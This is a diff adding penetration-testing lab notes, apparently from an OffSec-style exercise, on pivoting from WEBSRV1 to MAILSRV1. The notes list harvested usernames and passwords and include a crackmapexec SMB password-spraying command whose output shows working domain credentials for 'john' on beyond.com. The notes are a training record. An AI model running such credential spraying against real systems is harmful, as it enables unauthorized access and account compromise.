@@ -685,3 +685,50 @@ diff --git a/fetch_current.sh b/fetch_current.sh
 	- Add creds to notes
 
 > Once privs are elevated, running linpeas again might yield more results now we're root
+
+
+# Access to Internal
+
+### MAILSRV1 - 242
+
+As we've gotten a foothold and gathered creds on WEBSRV1, we can attempt to gain a foothold on MAILSRV1
+
+#### Domain Creds
+
+Should be crafting separate files for usernames and passwords
+```bash
+cat unames.txt
+	daniela
+	marcus
+	offsec
+	john
+
+cat pws.txt
+	tequiromucho
+	DanielKeyboard3311
+	dqsTwTpZPn#nL
+```
+
+- Re-consult ports for entry
+```bash
+25 - smtp
+80 - http
+110 - pop3
+135 - rpc
+139 - netbios
+143 - imap
+445 - smb
+587 - smtp
+```
+
+- Attempt cred cracking SMB
+```bash
+crackmapexec smb 192.168.216.242 -u unames.txt -p pws.txt --continue-on-success
+	SMB         192.168.216.242 445    MAILSRV1         [*] Windows Server 2022 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
+	... 
+	SMB         192.168.216.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL
+```
+	- Gives us the domain -> beyond.com
+	- creds we got for john work
+
+- 
